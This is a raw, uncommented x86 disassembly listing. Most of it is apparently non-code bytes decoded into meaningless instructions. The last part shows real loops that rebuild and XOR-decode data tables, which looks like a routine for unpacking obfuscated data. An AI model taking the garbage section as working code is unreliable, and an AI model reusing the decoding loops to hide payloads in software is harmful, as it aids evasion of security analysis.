  41db8a:	xlat   BYTE PTR ds:[ebx]
  41db8b:	mov    DWORD PTR [eax],edx
  41db8d:	add    BYTE PTR [ebp-0x1],al
  41db90:	jne    0x41dbeb
  41db92:	cmp    edi,0x4f
  41db95:	inc    DWORD PTR [ebx-0x74bb0058]
  41db9b:	call   DWORD PTR [edx]
  41db9d:	dec    DWORD PTR [eax]
  41db9f:	add    BYTE PTR [edi-0x6d],dh
  41dba2:	dec    esp
  41dba4:	and    edi,edi
  41dba6:	push   DWORD PTR [edi+edi*8-0x7a]
  41dbaa:	rol    BYTE PTR [eax],1
  41dbac:	cmp    DWORD PTR [ebx+0x3fa200f5],eax
  41dbb2:	add    DWORD PTR [ebx+0xaccff92],0xffffffff
  41dbb9:	push   0x52
  41dbbb:	sbb    DWORD PTR [edi+0x0],0x14
  41dbbf:	(bad)  
  41dbc0:	out    dx,eax
  41dbc1:	and    BYTE PTR [eax],al
  41dbc3:	add    ah,bh
  41dbc5:	(bad)  
  41dbc6:	inc    DWORD PTR [eax]
  41dbc8:	add    BYTE PTR [esi],bh
  41dbca:	jmp    0x6741b852
  41dbcf:	jmp    FWORD PTR [ebp+0x668300cb]
  41dbd5:	add    bh,bh
  41dbd7:	jae    0x41dbd8
  41dbd9:	push   edx
  41dbda:	sbb    bh,bh
  41dbdc:	sahf   
  41dbdd:	call   DWORD PTR [eax]
  41dbdf:	mov    DWORD PTR [ebx-0x24],ebx
  41dbe2:	cmp    edi,0xffffff82
  41dbe5:	inc    DWORD PTR [eax]
  41dbe7:	pop    ss
  41dbe8:	cmp    esi,0xffffff92
  41dbeb:	push   DWORD PTR [ebx]
  41dbed:	add    bl,ah
  41dbef:	int3   
  41dbf0:	in     al,dx
  41dbf1:	outs   dx,DWORD PTR ds:[esi]
  41dbf2:	dec    esp
  41dbf4:	push   esp
  41dbf5:	add    bh,bh
  41dbf7:	xor    eax,0x839216ff
  41dbfc:	test   al,0xff
  41dbfe:	retf   0x4700
  41dc01:	pop    ecx
  41dc02:	add    bh,bh
  41dc04:	or     BYTE PTR [eax],al
  41dc06:	add    BYTE PTR [esi],ch
  41dc08:	dec    eax
  41dc0a:	xor    eax,0x9f8318ff
  41dc0f:	call   DWORD PTR [ecx-0x18]
  41dc12:	inc    DWORD PTR [eax]
  41dc14:	iret   
  41dc15:	inc    DWORD PTR [eax]
  41dc17:	xchg   esi,eax
  41dc18:	jmp    FWORD PTR [edx-0x7c]
  41dc1b:	add    dl,bl
  41dc1d:	add    BYTE PTR [ecx+0x0],ch
  41dc20:	xchg   esp,eax
  41dc21:	popf   
  41dc22:	add    DWORD PTR [eax],0xffffffa5
  41dc25:	add    bh,bh
  41dc27:	jne    0x41dc29
  41dc29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc2a:	ret    
  41dc2b:	add    BYTE PTR [edi+0x0],dl
  41dc2e:	adc    eax,0xff24d9ff
  41dc33:	add    BYTE PTR [ebx+0x0],bl
  41dc36:	add    BYTE PTR [eax],dl
  41dc38:	push   esi
  41dc3a:	mov    cl,0x83
  41dc3c:	xor    bh,bh
  41dc3e:	(bad)  
  41dc3f:	int3   
  41dc40:	out    dx,eax
  41dc41:	sahf   
  41dc42:	(bad)  
  41dc43:	jmp    FWORD PTR [esi-0x765d007d]
  41dc49:	sbb    cl,0xff
  41dc4c:	aad    0x83
  41dc4e:	inc    edi
  41dc4f:	add    cl,dh
  41dc51:	or     bh,bh
  41dc53:	jmp    DWORD PTR [ebx-0x6b0001]
  41dc59:	call   0x12dc49
  41dc5e:	dec    edi
  41dc5f:	dec    DWORD PTR [esi+edx*8+0xdfff00]
  41dc66:	add    dh,bh
  41dc68:	jmp    edi
  41dc6a:	add    DWORD PTR [eax],eax
  41dc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc6d:	int3   
  41dc6e:	cdq    
  41dc6f:	call   DWORD PTR [ebx]
  41dc71:	lods   al,BYTE PTR ds:[esi]
  41dc72:	(bad)  
  41dc73:	jmp    FWORD PTR [eax-0x1]
  41dc76:	add    cl,dh
  41dc78:	inc    DWORD PTR [eax-0x46]
  41dc7b:	cmp    DWORD PTR [ebp+0xf006c89],0xffffffc2
  41dc82:	or     esp,0x66
  41dc85:	mov    DWORD PTR [ebx+0x557e0050],eax
  41dc8b:	(bad)  
  41dc8c:	clc    
  41dc8d:	jmp    DWORD PTR [edx]
  41dc8f:	add    BYTE PTR [ebp+eax*4-0x3316ff01],dh
  41dc96:	push   DWORD PTR ds:0x89ad73ff
  41dc9c:	fcos   
  41dc9e:	stos   DWORD PTR es:[edi],eax
  41dc9f:	xor    DWORD PTR [ebx+0x67000091],0x0
  41dca6:	add    DWORD PTR [ebp-0x1],0xffffffc6
  41dcaa:	pop    ebx
  41dcab:	push   DWORD PTR [ecx]
  41dcad:	call   FWORD PTR [ecx-0x1]
  41dcb0:	ds xchg edx,eax
  41dcb2:	int3   
  41dcb3:	or     esi,0xffffffff
  41dcb6:	push   DWORD PTR [ecx]
  41dcb8:	call   DWORD PTR [ebp-0x37]
  41dcbb:	jmp    DWORD PTR [eax]
  41dcbd:	sub    eax,0x0
  41dcc0:	mov    esi,0xba00008e
  41dcc5:	add    bh,bh
  41dcc7:	test   edi,edi
  41dcc9:	js     0x41dcf5
  41dccb:	add    BYTE PTR [edi],ah
  41dccd:	add    BYTE PTR [ebx+0x0],bl
  41dcd0:	and    ah,BYTE PTR [ebx]
  41dcd2:	(bad)  
  41dcd3:	jmp    DWORD PTR ds:0x8326ffcc
  41dcd9:	xchg   ebx,eax
  41dcda:	jo     0x41dcdb
  41dcdc:	pop    es
  41dcdd:	add    BYTE PTR [eax-0x1],bh
  41dce0:	mov    ch,0x8a
  41dce2:	inc    DWORD PTR [eax]
  41dce4:	ret    
  41dce5:	inc    DWORD PTR [eax]
  41dce7:	sub    al,0x83
  41dce9:	sub    BYTE PTR [eax-0x4b007a00],0xff
  41dcf0:	jbe    0x41dc8b
  41dcf2:	add    bh,bh
  41dcf4:	fxch   st(4)
  41dcf6:	add    BYTE PTR [ecx+0x97af00],dl
  41dcfc:	sbb    eax,DWORD PTR [eax]
  41dcfe:	or     edi,edi
  41dd00:	popf   
  41dd01:	inc    edx
  41dd02:	add    DWORD PTR [ebx-0x4f337ca7],0x0
  41dd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd0a:	lahf   
  41dd0b:	adc    DWORD PTR [edi],0xffffffff
  41dd0e:	add    BYTE PTR [eax],0x3e
  41dd11:	add    DWORD PTR [ebx-0x7c1f01],0x4d
  41dd18:	dec    esi
  41dd1a:	ss add bl,ch
  41dd1d:	inc    edi
  41dd1f:	int3   
  41dd20:	push   eax
  41dd21:	or     bh,bh
  41dd23:	int3   
  41dd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd25:	add    bh,bh
  41dd27:	dec    esp
  41dd28:	add    cl,dl
  41dd2a:	inc    DWORD PTR [eax]
  41dd2c:	dec    DWORD PTR es:[eax+eax*1+0xff12aa]
  41dd34:	ret    
  41dd35:	add    bh,bh
  41dd37:	and    bh,bh
  41dd39:	mov    ecx,0xff3700c9
  41dd3e:	inc    ecx
  41dd3f:	or     DWORD PTR [ebp-0x7e],0xffffffcc
  41dd43:	(bad)  
  41dd44:	fdivr  st,st(7)
  41dd46:	and    DWORD PTR [eax],0xffffffcc
  41dd49:	(bad)  
  41dd4b:	and    DWORD PTR [eax-0x1],0xffffffc8
  41dd4f:	int3   
  41dd50:	cmp    ecx,DWORD PTR [edi-0x4dff01]
  41dd56:	add    bh,bl
  41dd58:	add    bh,bl
  41dd5a:	ins    BYTE PTR es:[edi],dx
  41dd5b:	dec    DWORD PTR [edx-0x79003b01]
  41dd61:	mov    bh,0x0
  41dd63:	add    BYTE PTR [esi],bl
  41dd65:	inc    DWORD PTR [ebx+0x1e9c8926]
  41dd6b:	add    BYTE PTR [ebp+0x0],bl
  41dd6e:	aas    
  41dd6f:	call   DWORD PTR [edx]
  41dd71:	jne    0x41dd73
  41dd73:	dec    DWORD PTR [eax+eax*1]
  41dd76:	add    bl,ch
  41dd78:	push   DWORD PTR [ecx-0x1effd2]
  41dd7e:	jecxz  0x41dd09
  41dd80:	xor    DWORD PTR [edx-0x5c0100],0xffffffff
  41dd87:	jecxz  0x41dd89
  41dd89:	imul   edi,DWORD PTR [esi-0x1],0x69007a
  41dd90:	sbb    edx,DWORD PTR [eax-0x76150100]
  41dd96:	call   FWORD PTR ds:0xfff15bff
  41dd9c:	(bad)  
  41dd9e:	repz int3 
  41dda0:	inc    esp
  41dda1:	cmp    eax,0xae89ff
  41dda6:	(bad)  
  41dda7:	jg     0x41dd75
  41dda9:	(bad)  
  41ddaa:	call   0xe240efaf
  41ddaf:	adc    DWORD PTR [ebp+0x483007a],0xffffffff
  41ddb6:	add    dl,al
  41ddb8:	sub    DWORD PTR [ebx+ebx*2],0xffffffff
  41ddbc:	test   al,0xff
  41ddbe:	loope  0x41dd43
  41ddc0:	jnp    0x41ddbc
  41ddc2:	inc    DWORD PTR [eax]
  41ddc4:	fadd   QWORD PTR [ebx-0x447c3134]
  41ddca:	sub    edi,edi
  41ddcc:	mov    DWORD PTR [eax],eax
  41ddce:	dec    DWORD PTR [ecx+0x2ac1]
  41ddd4:	mov    WORD PTR [eax],es
  41ddd6:	jmp    ebp
  41ddd8:	add    BYTE PTR [eax+eiz*2+0x25831bff],bh
  41dddf:	call   FWORD PTR [esi+0x4c]
  41dde2:	add    DWORD PTR [ebx-0x307cffe0],0xffffff89
  41dde9:	pop    ss
  41ddea:	push   edi
  41ddeb:	inc    DWORD PTR [ecx+0x0]
  41ddee:	fild   WORD PTR [eax]
  41ddf0:	das    
  41ddf1:	imul   eax,DWORD PTR [eax],0x0
  41ddf4:	sub    al,0xcc
  41ddf6:	(bad)  
  41ddf7:	jl     0x41dd82
  41ddf9:	loopne 0x41de25
  41ddfb:	add    BYTE PTR [ebx-0x3fffd000],al
  41de01:	cmp    al,0xff
  41de03:	add    dh,al
  41de05:	add    BYTE PTR [ebx+0x5e8390],al
  41de0b:	add    bh,ch
  41de0d:	add    DWORD PTR [esi+0x8ce800],0xffffff83
  41de14:	in     al,dx
  41de15:	add    bh,bh
  41de17:	out    dx,eax
  41de18:	add    BYTE PTR [eax],ah
  41de1a:	jnp    0x41de1c
  41de1c:	imul   edi,edi,0xc5b700c5
  41de22:	int3   
  41de23:	(bad)  
  41de24:	jmp    0x7c53:0xff3083ff
  41de2b:	jmp    esi
  41de2d:	add    BYTE PTR [ecx],cl
  41de2f:	call   DWORD PTR [edx-0x53ff0008]
  41de35:	(bad)  
  41de36:	dec    edi
  41de38:	add    BYTE PTR [ecx+esi*2],cl
  41de3b:	add    BYTE PTR [esi],ch
  41de3d:	mov    DWORD PTR [ecx-0x34],esp
  41de40:	jb     0x41de26
  41de42:	(bad)  
  41de43:	jmp    FWORD PTR [edi]
  41de45:	add    DWORD PTR [eax],0x6e
  41de48:	push   DWORD PTR [esi]
  41de4a:	inc    esp
  41de4b:	(bad)  
  41de4c:	jns    0x41de4d
  41de4e:	scas   eax,DWORD PTR es:[edi]
  41de4f:	mov    edi,ecx
  41de51:	sub    al,0x0
  41de53:	call   FWORD PTR [ecx+0x4bffff]
  41de59:	lock push esp
  41de5b:	dec    DWORD PTR [eax-0x28ff2000]
  41de61:	jno    0x41de62
  41de63:	add    BYTE PTR [ebp+0x2f83ff],cl
  41de69:	mov    ds:0xffcd83dd,eax
  41de6e:	dec    edx
  41de6f:	inc    DWORD PTR [eax+0x0]
  41de72:	add    DWORD PTR [eax],0xffffffeb
  41de75:	inc    DWORD PTR [eax]
  41de77:	and    eax,0xab3189
  41de7c:	inc    esi
  41de7d:	jmp    edx
  41de7f:	call   FWORD PTR [esi+0x5aff8997]
  41de85:	dec    esp
  41de87:	cmp    edi,edi
  41de89:	int3   
  41de8a:	cdq    
  41de8b:	add    BYTE PTR [edi-0x1],cl
  41de8e:	bound  ecx,QWORD PTR [ecx-0x7600308d]
  41de94:	sbb    al,0x0
  41de96:	call   DWORD PTR [edx-0x1]
  41de99:	sbb    eax,0xff70839e
  41de9e:	ins    BYTE PTR es:[edi],dx
  41de9f:	add    BYTE PTR [ebp+0x1b830074],dl
  41dea5:	add    BYTE PTR [eax],al
  41dea7:	mov    ?,edi
  41dea9:	ins    BYTE PTR es:[edi],dx
  41deaa:	or     eax,0x77fffeff
  41deaf:	(bad)  
  41deb0:	in     eax,dx
  41deb1:	add    al,BYTE PTR [ebx-0xff0e00]
  41deb7:	(bad)  
  41debb:	push   DWORD PTR [ecx-0x1]
  41debe:	and    DWORD PTR [eax],eax
  41dec0:	add    bh,BYTE PTR [ebx-0x6cff01]
  41dec6:	jmp    DWORD PTR [ebx]
  41dec8:	dec    DWORD PTR [edi]
  41deca:	adc    bh,bh
  41decc:	(bad)  
  41decd:	(bad)  
  41dece:	jmp    0x9cff:0xff744dff
  41ded5:	add    BYTE PTR [eax],al
  41ded7:	xor    edi,edi
  41ded9:	xor    eax,0xcc1d00a0
  41dede:	add    edi,edi
  41dee0:	fadd   DWORD PTR [esi-0x7d]
  41dee3:	add    BYTE PTR [edx+0x4d00ff],cl
  41dee9:	retf   0x77
  41deec:	cmp    edi,0xd144ccb9
  41def2:	inc    DWORD PTR [eax]
  41def4:	inc    esi
  41def5:	int3   
  41def6:	jmp    FWORD PTR [eax+0x0]
  41def9:	(bad)  
  41defa:	lock push ebx
  41defd:	jmp    DWORD PTR [edi+edi*8-0x7678c9]
  41df04:	jae    0x41df06
  41df06:	add    BYTE PTR [esi],bl
  41df08:	add    ch,ch
  41df0a:	ud0    edx,DWORD PTR [ebp-0x1]
  41df0e:	jge    0x41df0f
  41df10:	jbe    0x41dec8
  41df12:	mov    edi,edi
  41df14:	add    DWORD PTR [ebx-0x28ffcf01],0xffffffaa
  41df1b:	jmp    FWORD PTR [edx-0x1]
  41df1e:	lds    eax,FWORD PTR [eax]
  41df20:	fdiv   QWORD PTR [ebx-0x1f0001]
  41df26:	jmp    FWORD PTR [ecx]
  41df28:	mov    DWORD PTR [eax-0x76e6ff8d],esi
  41df2e:	std    
  41df2f:	call   esi
  41df31:	xchg   esp,eax
  41df32:	int3   
  41df33:	dec    esp
  41df35:	add    BYTE PTR [eax],al
  41df37:	idiv   bh
  41df39:	mov    ecx,0x5eff6e
  41df3e:	scas   al,BYTE PTR es:[edi]
  41df3f:	(bad)  
  41df40:	fstp   TBYTE PTR [esi]
  41df42:	add    bh,bh
  41df44:	lahf   
  41df45:	(bad)  
  41df46:	dec    DWORD PTR [ebx-0x34]
  41df49:	push   ebx
  41df4a:	mov    cl,0x89
  41df4c:	dec    esp
  41df4d:	dec    DWORD PTR [edi-0x33815377]
  41df53:	cmp    ecx,0xffffff83
  41df56:	int3   
  41df57:	or     edi,edi
  41df59:	cmc    
  41df5a:	inc    esi
  41df5b:	int3   
  41df5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df5d:	(bad)  
  41df5e:	(bad)  
  41df5f:	inc    edi
  41df61:	adc    edi,edi
  41df63:	add    BYTE PTR [ebp-0xb90000],al
  41df69:	adc    eax,0xffae836b
  41df6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df6f:	dec    DWORD PTR [ebp+eax*2-0x1]
  41df73:	call   FWORD PTR [esi+0x0]
  41df76:	sbb    esi,0xffffffff
  41df79:	cwde   
  41df7a:	(bad)  
  41df7c:	sub    bh,bh
  41df7e:	xor    al,BYTE PTR [eax]
  41df80:	xor    cl,BYTE PTR [ecx+ecx*4]
  41df83:	int3   
  41df84:	inc    DWORD PTR gs:[eax]
  41df87:	and    eax,0xff087bff
  41df8c:	push   eax
  41df8d:	inc    DWORD PTR [eax+eax*1+0x5d]
  41df91:	dec    esp
  41df92:	add    bh,bh
  41df94:	ss dec esp
  41df97:	jmp    0xccd1f19b
  41df9c:	adc    BYTE PTR [ebx+0x3d8600b0],al
  41dfa2:	int3   
  41dfa3:	add    BYTE PTR [edi],dl
  41dfa5:	mov    edi,edi
  41dfa7:	sub    bh,bh
  41dfa9:	adc    BYTE PTR ds:0x33ffe6ff,0xff
  41dfb0:	adc    al,0x5d
  41dfb2:	add    BYTE PTR [ebx-0x79760079],al
  41dfb8:	xor    ebx,0xffffffbc
  41dfbb:	add    dl,al
  41dfbd:	dec    ebx
  41dfbf:	call   DWORD PTR [edx+0x5a00ff22]
  41dfc5:	inc    DWORD PTR [ebx-0x7f9ff54]
  41dfcb:	int3   
  41dfcc:	outs   dx,BYTE PTR ds:[esi]
  41dfcd:	add    BYTE PTR [esi-0x1f5000],bh
  41dfd3:	add    BYTE PTR ds:0xff730000,ch
  41dfd9:	enter  0xc7,0x1f
  41dfdd:	mov    DWORD PTR [ebx-0x7cac8701],esp
  41dfe3:	push   ebp
  41dfe5:	(bad)  
  41dfe6:	inc    edi
  41dfe8:	mov    DWORD PTR [ebp+0x72],edi
  41dfeb:	dec    DWORD PTR [edi+edi*8+0x1a]
  41dfef:	add    BYTE PTR [ebp+0x70],dl
  41dff2:	add    bh,bh
  41dff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff5:	add    DWORD PTR [eax],0x24
  41dff8:	add    BYTE PTR [edx],dl
  41dffa:	mov    ebx,0xeaff76ff
  41dfff:	add    BYTE PTR [esi],bl
  41e001:	or     bh,bh
  41e003:	push   DWORD PTR [ecx-0x660001]
  41e009:	int3   
  41e00a:	and    edi,edi
  41e00c:	enter  0xf483,0xff
  41e010:	jg     0x41e009
  41e012:	inc    DWORD PTR [eax]
  41e014:	mov    es,WORD PTR [eax]
  41e016:	jmp    DWORD PTR [ebx+0x0]
  41e019:	xor    ch,dh
  41e01b:	mov    DWORD PTR [eax],ebp
  41e01d:	add    BYTE PTR [edx],dl
  41e01f:	add    BYTE PTR [edx+ebx*8-0x1],ch
  41e023:	add    BYTE PTR [ebp-0x1],bh
  41e026:	(bad)  
  41e027:	cmp    eax,DWORD PTR [ebx+0x1800348a]
  41e02d:	jmp    FWORD PTR [eax]
  41e02f:	mov    esi,edx
  41e031:	repz (bad) 
  41e033:	(bad)  
  41e034:	std    
  41e035:	add    BYTE PTR [ecx+0x117ff10],cl
  41e03b:	xor    DWORD PTR [edi-0x1],0xfffffff0
  41e03f:	call   edi
  41e041:	ret    0xffff
  41e044:	popa   
  41e045:	(bad)  
  41e046:	inc    DWORD PTR [ebp+0x5ec9ff]
  41e04c:	adc    al,0xff
  41e04e:	sar    edi,0xb3
  41e051:	ja     0x41e052
  41e053:	mov    DWORD PTR [edi-0xf3007d],esi
  41e059:	push   ds
  41e05a:	sbb    al,0xcc
  41e05c:	xchg   esp,eax
  41e05d:	add    ah,bl
  41e05f:	call   FWORD PTR [edx-0x6b7c006d]
  41e065:	inc    DWORD PTR [ebx+0x7f84ffea]
  41e06b:	xor    DWORD PTR [ecx+0x5c00c5ff],0xfffffffb
  41e072:	cmp    edi,0x55
  41e075:	inc    DWORD PTR [ebx+0x7b16ff3f]
  41e07b:	mov    DWORD PTR [edx-0x34],esp
  41e07e:	dec    ebp
  41e07f:	(bad)  
  41e080:	cmp    cl,BYTE PTR [eax+0x5a0000]
  41e086:	inc    DWORD PTR [ecx]
  41e088:	int3   
  41e089:	inc    eax
  41e08a:	jmp    0x59c58e8e
  41e08f:	add    BYTE PTR [esi-0x70],ah
  41e092:	(bad)  
  41e093:	call   ecx
  41e095:	(bad)  
  41e096:	inc    DWORD PTR [edx-0x7d]
  41e099:	mov    ds:0x44ff27,al
  41e09e:	or     al,0x0
  41e0a0:	jg     0x41e022
  41e0a2:	add    DWORD PTR [eax],0x1f
  41e0a5:	cmp    edi,0xffffffef
  41e0a8:	call   FWORD PTR [esi]
  41e0aa:	sbb    edi,edi
  41e0ac:	xlat   BYTE PTR ds:[ebx]
  41e0ad:	cmp    DWORD PTR [ebp-0x7d],0x38
  41e0b1:	or     edi,edi
  41e0b3:	add    BYTE PTR [ebx],cl
  41e0b5:	add    bh,bh
  41e0b7:	(bad)  
  41e0b9:	add    ebx,ecx
  41e0bb:	push   DWORD PTR [ebx-0x6d008501]
  41e0c1:	fadd   QWORD PTR [eax]
  41e0c3:	mov    DWORD PTR [ebx],ecx
  41e0c5:	dec    DWORD PTR [ecx+0x7184ff22]
  41e0cb:	adc    DWORD PTR [ebx+0x7a002700],0x46
  41e0d2:	add    DWORD PTR [eax],0xffffffd0
  41e0d5:	cmp    edi,0xffffff98
  41e0d8:	push   DWORD PTR [eax]
  41e0da:	jbe    0x41e0db
  41e0dc:	mov    edx,0xa400c2ff
  41e0e1:	sbb    edi,edi
  41e0e3:	int3   
  41e0e4:	jb     0x41e0b2
  41e0e6:	add    ah,bl
  41e0e8:	mov    DWORD PTR [eax],eax
  41e0ea:	add    DWORD PTR [eax],0x0
  41e0ed:	add    bh,bh
  41e0ef:	inc    DWORD PTR [ecx+0x428ec]
  41e0f5:	add    BYTE PTR [ebx+0x55],dl
  41e0f8:	push   esi
  41e0f9:	push   edi
  41e0fa:	push   0x42
  41e0fc:	push   0x42
  41e0fe:	call   DWORD PTR ds:0x445014
  41e104:	push   0x0
  41e106:	push   0x0
  41e108:	push   0x0
  41e10a:	mov    DWORD PTR [esp+0x1c],eax
  41e10e:	call   DWORD PTR ds:0x445018
  41e114:	lea    eax,[esp+0x14]
  41e118:	push   eax
  41e119:	call   DWORD PTR ds:0x445028
  41e11f:	mov    esi,DWORD PTR ds:0x448d20
  41e125:	mov    edi,DWORD PTR ds:0x445050
  41e12b:	add    esi,0x153c0
  41e131:	mov    ebx,0x11c
  41e136:	push   0x100
  41e13b:	lea    ecx,[esp+0x3c]
  41e13f:	push   ecx
  41e140:	push   0x447a74
  41e145:	call   edi
  41e147:	mov    ecx,DWORD PTR ds:0x448000
  41e14d:	movzx  eax,BYTE PTR [ecx+0x7]
  41e151:	movzx  edx,BYTE PTR [ecx+0x4]
  41e155:	movzx  ecx,WORD PTR [ecx]
  41e158:	shl    eax,0x8
  41e15b:	add    eax,edx
  41e15d:	shl    eax,0x10
  41e160:	add    eax,ecx
  41e162:	mov    ds:0x448d10,eax
  41e167:	mov    edx,0x26895b38
  41e16c:	sub    edx,DWORD PTR ds:0x448d1c
  41e172:	add    esi,0x8
  41e175:	xor    edx,eax
  41e177:	mov    DWORD PTR [esi-0x8],edx
  41e17a:	mov    ecx,DWORD PTR ds:0x448000
  41e180:	movzx  eax,BYTE PTR [ecx+0xe]
  41e184:	movzx  edx,BYTE PTR [ecx+0xc]
  41e188:	movzx  ecx,WORD PTR [ecx+0x9]
  41e18c:	shl    eax,0x8
  41e18f:	add    eax,edx
  41e191:	shl    eax,0x10
  41e194:	add    eax,ecx
  41e196:	mov    edx,0x26895b38
  41e19b:	sub    edx,DWORD PTR ds:0x448d1c
  41e1a1:	mov    ds:0x448d10,eax
  41e1a6:	xor    edx,eax
  41e1a8:	mov    DWORD PTR [esi-0x4],edx
  41e1ab:	mov    ecx,DWORD PTR ds:0x448000
  41e1b1:	add    ecx,0x10
  41e1b4:	dec    ebx
  41e1b5:	mov    DWORD PTR ds:0x448000,ecx
  41e1bb:	jne    0x41e136
  41e1c1:	movzx  eax,BYTE PTR [ecx+0x7]
  41e1c5:	movzx  edx,BYTE PTR [ecx+0x4]
  41e1c9:	movzx  ecx,WORD PTR [ecx]
  41e1cc:	shl    eax,0x8
  41e1cf:	add    eax,edx
  41e1d1:	shl    eax,0x10
  41e1d4:	add    eax,ecx
  41e1d6:	mov    edx,0x26895b38
  41e1db:	sub    edx,DWORD PTR ds:0x448d1c
  41e1e1:	mov    ds:0x448d10,eax
  41e1e6:	xor    edx,eax
  41e1e8:	mov    DWORD PTR [esi],edx
  41e1ea:	mov    eax,ds:0x448d20
  41e1ef:	mov    edx,DWORD PTR ds:0x448004
  41e1f5:	add    eax,0x15ca4
  41e1fa:	mov    esi,0x89
  41e1ff:	nop
  41e200:	movzx  ecx,BYTE PTR [edx+0x6]
  41e204:	movzx  ebx,WORD PTR [edx+0x4]
  41e208:	movzx  edx,BYTE PTR [edx]
  41e20b:	shl    ecx,0x10
  41e20e:	add    ecx,ebx
  41e210:	shl    ecx,0x8
  41e213:	add    ecx,edx
  41e215:	mov    DWORD PTR ds:0x448d10,ecx
  41e21b:	mov    edx,0x89a2d197
  41e220:	sub    edx,DWORD PTR ds:0x448d1c
  41e226:	add    eax,0x10
  41e229:	xor    edx,ecx
  41e22b:	mov    DWORD PTR [eax-0x10],edx
  41e22e:	mov    edx,DWORD PTR ds:0x448004
  41e234:	movzx  ecx,WORD PTR [edx+0xd]
  41e238:	movzx  ebx,BYTE PTR [edx+0xb]
  41e23c:	movzx  edx,BYTE PTR [edx+0x9]
  41e240:	shl    ecx,0x8
  41e243:	add    ecx,ebx
  41e245:	shl    ecx,0x8
  41e248:	add    ecx,edx
  41e24a:	mov    DWORD PTR ds:0x448d10,ecx
  41e250:	mov    edx,0x89a2d197
  41e255:	sub    edx,DWORD PTR ds:0x448d1c
  41e25b:	xor    edx,ecx
  41e25d:	mov    DWORD PTR [eax-0xc],edx
  41e260:	mov    edx,DWORD PTR ds:0x448004
  41e266:	add    edx,0x10
  41e269:	mov    DWORD PTR ds:0x448004,edx
  41e26f:	movzx  ecx,BYTE PTR [edx+0x6]
  41e273:	movzx  ebx,WORD PTR [edx+0x4]
  41e277:	movzx  edx,BYTE PTR [edx]
  41e27a:	shl    ecx,0x10
  41e27d:	add    ecx,ebx
  41e27f:	shl    ecx,0x8
  41e282:	add    ecx,edx
  41e284:	mov    DWORD PTR ds:0x448d10,ecx
  41e28a:	mov    edx,0x89a2d197
  41e28f:	sub    edx,DWORD PTR ds:0x448d1c
  41e295:	xor    edx,ecx
  41e297:	mov    DWORD PTR [eax-0x8],edx
  41e29a:	mov    edx,DWORD PTR ds:0x448004
  41e2a0:	movzx  ecx,WORD PTR [edx+0xd]
  41e2a4:	movzx  ebx,BYTE PTR [edx+0xb]
  41e2a8:	movzx  edx,BYTE PTR [edx+0x9]
  41e2ac:	shl    ecx,0x8
  41e2af:	add    ecx,ebx
  41e2b1:	shl    ecx,0x8
  41e2b4:	add    ecx,edx
  41e2b6:	mov    edx,0x89a2d197
  41e2bb:	sub    edx,DWORD PTR ds:0x448d1c
  41e2c1:	mov    DWORD PTR ds:0x448d10,ecx
  41e2c7:	xor    edx,ecx
  41e2c9:	mov    DWORD PTR [eax-0x4],edx
  41e2cc:	mov    edx,DWORD PTR ds:0x448004
  41e2d2:	add    edx,0x10
  41e2d5:	dec    esi
  41e2d6:	mov    DWORD PTR ds:0x448004,edx
  41e2dc:	jne    0x41e200
  41e2e2:	mov    esi,DWORD PTR ds:0x448d20
  41e2e8:	mov    ebp,DWORD PTR ds:0x44504c
  41e2ee:	add    esi,0x16534
  41e2f4:	mov    ebx,0x132
  41e2f9:	lea    esp,[esp+0x0]
  41e300:	push   0x447a70
  41e305:	push   0x0
  41e307:	call   ebp
  41e309:	mov    ecx,DWORD PTR ds:0x448008
  41e30f:	movzx  eax,BYTE PTR [ecx+0x5]
  41e313:	movzx  edx,WORD PTR [ecx+0x3]
  41e317:	movzx  ecx,BYTE PTR [ecx]
  41e31a:	shl    eax,0x10
  41e31d:	add    eax,edx
  41e31f:	shl    eax,0x8
  41e322:	add    eax,ecx
  41e324:	mov    edx,0x98c39960
  41e329:	sub    edx,DWORD PTR ds:0x448d1c
  41e32f:	mov    ds:0x448d10,eax
  41e334:	xor    edx,eax
  41e336:	push   0x100
  41e33b:	lea    eax,[esp+0x23c]
  41e342:	push   eax
  41e343:	push   0x447a5c
  41e348:	mov    DWORD PTR [esi],edx
  41e34a:	call   edi
  41e34c:	mov    ecx,DWORD PTR ds:0x448008
  41e352:	movzx  eax,BYTE PTR [ecx+0xf]
  41e356:	movzx  edx,BYTE PTR [ecx+0xd]
  41e35a:	movzx  ecx,WORD PTR [ecx+0x7]
  41e35e:	shl    eax,0x8
  41e361:	add    eax,edx
  41e363:	mov    edx,DWORD PTR ds:0x448d1c
  41e369:	shl    eax,0x10
  41e36c:	add    eax,ecx
  41e36e:	add    edx,0x98bb9594
  41e374:	xor    edx,eax
  41e376:	mov    ds:0x448d10,eax
  41e37b:	mov    DWORD PTR [esi+0x4],edx
  41e37e:	add    DWORD PTR ds:0x448008,0x10
  41e385:	add    esi,0x8
  41e388:	dec    ebx
  41e389:	jne    0x41e300
  41e38f:	mov    ebp,DWORD PTR ds:0x445028
  41e395:	lea    eax,[esp+0x14]
  41e399:	push   eax
  41e39a:	call   ebp
  41e39c:	mov    eax,ds:0x448d20
  41e3a1:	mov    edx,DWORD PTR ds:0x44800c
  41e3a7:	add    eax,0x16ec4
  41e3ac:	lea    esi,[ebx+0x1f]
  41e3af:	nop
  41e3b0:	movzx  ecx,BYTE PTR [edx+0x4]
  41e3b4:	movzx  edi,WORD PTR [edx+0x2]
  41e3b8:	movzx  edx,BYTE PTR [edx]
  41e3bb:	shl    ecx,0x10
  41e3be:	add    ecx,edi
  41e3c0:	shl    ecx,0x8
  41e3c3:	add    ecx,edx
  41e3c5:	mov    DWORD PTR ds:0x448d10,ecx
  41e3cb:	mov    edx,0x4b4babc
  41e3d0:	sub    edx,DWORD PTR ds:0x448d1c
  41e3d6:	xor    edx,ecx
  41e3d8:	mov    DWORD PTR [eax],edx
  41e3da:	mov    edx,DWORD PTR ds:0x44800c
  41e3e0:	movzx  ecx,WORD PTR [edx+0xa]
  41e3e4:	movzx  edi,BYTE PTR [edx+0x8]
  41e3e8:	movzx  edx,BYTE PTR [edx+0x6]
  41e3ec:	shl    ecx,0x8
  41e3ef:	add    ecx,edi
  41e3f1:	shl    ecx,0x8
  41e3f4:	add    ecx,edx
